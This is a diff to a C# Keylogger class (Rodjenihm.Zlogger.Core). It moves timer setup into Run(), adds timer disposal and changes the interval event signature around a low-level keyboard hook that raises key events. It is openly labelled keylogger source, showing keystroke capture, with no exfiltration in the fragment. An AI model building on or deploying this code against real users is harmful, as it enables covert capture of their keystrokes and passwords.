@@ -17,10 +17,7 @@ namespace Rodjenihm.Zlogger.Core
 
         public Keylogger()
         {
-            timer.Interval = 1000 * Interval;
-            timer.Enabled = true;
-            timer.Elapsed += OnIntervalElapsed;
-
+            timer.Elapsed += (sender, e) => OnIntervalElapsed(this);
             hook = new LowLevelKeyboardHook();
             keyboardHookProc = (nCode, wParam, lParam) =>
             {
@@ -50,18 +47,27 @@ namespace Rodjenihm.Zlogger.Core
 
         public void Run()
         {
-            if (keyboardHookProc != null) hook.SetHook(keyboardHookProc);
-            else throw new ArgumentNullException("Keyboard Hook Procedure is null", nameof(keyboardHookProc));
+            if (keyboardHookProc != null)
+            {
+                hook.SetHook(keyboardHookProc);
+                timer.Interval = 1000 * Interval;
+                timer.Enabled = true;
+            }
+            else
+            {
+                throw new ArgumentNullException("Keyboard Hook Procedure is null", nameof(keyboardHookProc));
+            }
         }
 
         public void Dispose()
         {
             hook.RemoveHook();
+            timer.Dispose();
         }
 
         public event Action<Keylogger, KeyEventArgs> KeyDown;
         public event Action<Keylogger, KeyEventArgs> KeyUp;
-        public event EventHandler IntervalElapsed;
+        public event Action<Keylogger> IntervalElapsed;
 
         protected virtual void OnKeyDown(Keylogger sender, KeyEventArgs e)
         {
@@ -73,9 +79,9 @@ namespace Rodjenihm.Zlogger.Core
             KeyUp?.Invoke(sender, e);
         }
 
-        protected virtual void OnIntervalElapsed(object sender, EventArgs e)
+        protected virtual void OnIntervalElapsed(Keylogger keylogger)
         {
-            IntervalElapsed?.Invoke(sender, e);
+            IntervalElapsed?.Invoke(keylogger);
         }
     }
 }
